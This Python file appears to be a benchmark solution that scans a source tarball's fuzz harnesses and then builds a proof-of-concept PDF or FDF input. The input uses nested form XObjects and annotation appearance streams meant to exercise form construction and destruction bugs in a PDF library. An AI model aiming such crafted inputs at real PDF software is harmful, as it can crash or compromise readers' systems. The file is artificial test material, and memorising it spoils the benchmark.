import io
import os
import re
import tarfile
from typing import List, Optional, Tuple


class _PDFBuilder:
    def __init__(self, header: bytes):
        if not header.endswith(b"\n"):
            header += b"\n"
        self.header = header
        self._objs: List[bytes] = []

    def add_obj(self, body: bytes) -> int:
        self._objs.append(body)
        return len(self._objs)

    def add_stream_obj(self, dict_prefix: bytes, stream_data: bytes) -> int:
        dp = dict_prefix.strip()
        if not dp.startswith(b"<<") or not dp.endswith(b">>"):
            raise ValueError("dict_prefix must be a PDF dict like b'<< ... >>'")
        # Inject /Length before >>
        if b"/Length" in dp:
            d = dp
        else:
            d = dp[:-2].rstrip() + b" /Length " + str(len(stream_data)).encode("ascii") + b" >>"
        body = d + b"\nstream\n" + stream_data + b"\nendstream"
        return self.add_obj(body)

    def build(self, root_obj_num: int) -> bytes:
        out = bytearray()
        out += self.header

        offsets = [0] * (len(self._objs) + 1)
        for i, body in enumerate(self._objs, start=1):
            offsets[i] = len(out)
            out += str(i).encode("ascii") + b" 0 obj\n"
            out += body
            if not out.endswith(b"\n"):
                out += b"\n"
            out += b"endobj\n"

        xref_off = len(out)
        out += b"xref\n"
        out += b"0 " + str(len(self._objs) + 1).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for i in range(1, len(self._objs) + 1):
            out += f"{offsets[i]:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n"
        out += b"<< /Size " + str(len(self._objs) + 1).encode("ascii")
        out += b" /Root " + str(root_obj_num).encode("ascii") + b" 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_off).encode("ascii") + b"\n"
        out += b"%%EOF\n"
        return bytes(out)


def _choose_kind_from_src_tar(src_path: str) -> str:
    # Heuristic: inspect fuzz harness / mains to see whether input is PDF or FDF.
    # Return "pdf" or "fdf".
    score_pdf = 0
    score_fdf = 0

    def score_text(t: str) -> Tuple[int, int]:
        sp = 0
        sf = 0
        if "LLVMFuzzerTestOneInput" in t:
            sp += 2
            sf += 2
        if re.search(r"\bPDFDoc\b", t):
            sp += 6
        if re.search(r"\bFDFDoc\b", t) or re.search(r"\bFdf\b", t) or re.search(r"\bXFDF\b", t):
            sf += 8
        if "%PDF-" in t:
            sp += 3
        if "%FDF-" in t:
            sf += 5
        if re.search(r"\bstandalone\s+form", t, flags=re.IGNORECASE):
            sf += 2
        if re.search(r"\bForm\b", t) and re.search(r"\bAnnot\b", t):
            sp += 1
            sf += 1
        if re.search(r"\bparseFDF\b", t):
            sf += 6
        if re.search(r"\bparsePDF\b", t):
            sp += 4
        if re.search(r"\bAcroForm\b", t):
            sp += 2
            sf += 1
        return sp, sf

    # Scan selectively for harness-like files
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return "pdf"

    with tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            name = m.name.lower()
            if not (name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"))):
                continue
            if m.size <= 0 or m.size > 2_000_000:
                continue
            # Prefer fuzz and test harness locations
            if not any(k in name for k in ("fuzz", "fuzzer", "oss-fuzz", "test", "tests", "tool", "tools", "main")):
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin1", errors="ignore")
            if ("LLVMFuzzerTestOneInput" not in text) and ("main(" not in text) and ("Main(" not in text):
                continue
            sp, sf = score_text(text)
            score_pdf += sp
            score_fdf += sf

        # If we didn't find a harness, do a lightweight broader scan for strong indicators
        if score_pdf == 0 and score_fdf == 0:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name.lower()
                if not (name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"))):
                    continue
                if m.size <= 0 or m.size > 1_000_000:
                    continue
                if not any(k in name for k in ("fdf", "xfdf", "pdfdoc", "pdf", "form")):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                t = data.decode("utf-8", errors="ignore")
                if "FDFDoc" in t or "%FDF-" in t:
                    score_fdf += 2
                if "PDFDoc" in t or "%PDF-" in t:
                    score_pdf += 2

    # Conservative: default to PDF if tie/uncertain
    return "fdf" if score_fdf > score_pdf else "pdf"


def _make_pdf_poc() -> bytes:
    b = _PDFBuilder(header=b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")

    # Nested form XObjects to increase likelihood of exercising form construction/destruction paths.
    fm1_data = b"q Q"
    fm1 = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Resources << >> >>",
        fm1_data,
    )

    fm0_data = b"q /Fm1 Do Q"
    fm0 = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 100 100] "
        b"/Resources << /XObject << /Fm1 %d 0 R >> >> >>" % fm1,
        fm0_data,
    )

    fm2_data = b"q Q"
    fm2 = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Resources << >> >>",
        fm2_data,
    )

    ap_data = b"q /Fm2 Do Q"
    ap = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 40 20] "
        b"/Resources << /XObject << /Fm2 %d 0 R >> >> >>" % fm2,
        ap_data,
    )

    contents_data = b"q 1 0 0 1 20 20 cm /Fm0 Do Q\n"
    contents = b.add_stream_obj(b"<< >>", contents_data)

    # Page tree
    # Placeholder numbers; will fill after creation.
    # Objects created so far: fm1, fm0, fm2, ap, contents
    # Next: pages, page, widget, acroform, catalog

    pages = b.add_obj(b"<< /Type /Pages /Kids [ %d 0 R ] /Count 1 >>" % (len(b._objs) + 1))
    page_num = len(b._objs) + 1

    page = b.add_obj(
        b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 200 200] "
        b"/Resources << /XObject << /Fm0 %d 0 R >> >> "
        b"/Contents %d 0 R "
        b"/Annots [ %d 0 R ] >>" % (pages, fm0, contents, page_num + 1)
    )

    widget = b.add_obj(
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (A) /V (B) "
        b"/Rect [10 10 150 40] /F 4 /P %d 0 R "
        b"/AP << /N %d 0 R >> >>" % (page, ap)
    )

    acroform = b.add_obj(b"<< /Fields [ %d 0 R ] /NeedAppearances true >>" % widget)

    catalog = b.add_obj(b"<< /Type /Catalog /Pages %d 0 R /AcroForm %d 0 R >>" % (pages, acroform))

    return b.build(root_obj_num=catalog)


def _make_fdf_poc() -> bytes:
    # Create an FDF file that contains annotations with appearance streams (Form XObjects).
    # This should exercise standalone-form creation/destruction in FDF contexts.
    b = _PDFBuilder(header=b"%FDF-1.2\n%\xe2\xe3\xcf\xd3\n")

    # Create two form appearances (nested) to increase coverage.
    f1 = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Resources << >> >>",
        b"q Q",
    )
    f0 = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /FormType 1 /BBox [0 0 50 50] "
        b"/Resources << /XObject << /F1 %d 0 R >> >> >>" % f1,
        b"q /F1 Do Q",
    )

    a1 = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Resources << >> >>",
        b"q Q",
    )
    a0 = b.add_stream_obj(
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 50 50] "
        b"/Resources << /XObject << /A1 %d 0 R >> >> >>" % a1,
        b"q /A1 Do Q",
    )

    # Annots
    annot1 = b.add_obj(
        b"<< /Type /Annot /Subtype /Text /Rect [0 0 10 10] /Contents (x) /Page 0 "
        b"/AP << /N %d 0 R >> >>" % f0
    )
    annot2 = b.add_obj(
        b"<< /Type /Annot /Subtype /Stamp /Rect [0 0 10 10] /Name /Draft /Page 0 "
        b"/AP << /N %d 0 R >> >>" % a0
    )

    fdfdict = b.add_obj(
        b"<< /Type /Catalog /FDF << /F (dummy.pdf) /Annots [ %d 0 R %d 0 R ] >> >>" % (annot1, annot2)
    )

    return b.build(root_obj_num=fdfdict)


class Solution:
    def solve(self, src_path: str) -> bytes:
        kind = _choose_kind_from_src_tar(src_path)
        if kind == "fdf":
            return _make_fdf_poc()
        return _make_pdf_poc()